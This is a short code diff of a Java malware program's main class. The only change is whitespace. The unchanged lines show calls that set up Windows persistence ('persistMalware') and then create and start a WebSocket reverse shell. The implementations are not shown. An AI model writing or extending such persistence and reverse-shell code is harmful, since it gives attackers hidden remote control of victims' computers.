@@ -21,7 +21,6 @@ public class Main {
         System.out.println(persistMalware.createPersistenceWindows());
 
 //        start reverse shell
-
         WebsocketReverseShellService reverseShell= new ReverseShell();
         reverseShell.createClient();
         reverseShell.startReverseShell();
@@ -30,6 +29,8 @@ public class Main {
 
 
     }
+
+
 
 
 
